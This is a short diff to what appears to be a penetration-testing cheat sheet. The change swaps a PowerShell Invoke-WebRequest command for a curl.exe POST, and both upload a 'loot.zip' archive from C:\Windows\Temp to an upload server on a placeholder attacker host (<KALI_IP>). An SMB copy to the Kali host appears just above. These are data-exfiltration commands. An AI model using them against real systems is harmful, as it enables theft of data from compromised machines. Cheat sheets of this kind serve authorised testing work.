@@ -491,7 +491,7 @@ win> copy file \\KaliIP\sharename
 ```
 ```powershell
 uploadserver 8000
-Invoke-WebRequest -Uri http://<KALI_IP>:8000/upload -Method POST -InFile C:\Windows\Temp\loot.zip
+curl.exe -X POST -F "files=@C:\Windows\Temp\loot.zip" http://<KALI_IP>:8000/upload
 ```
 
 ## Adding Users
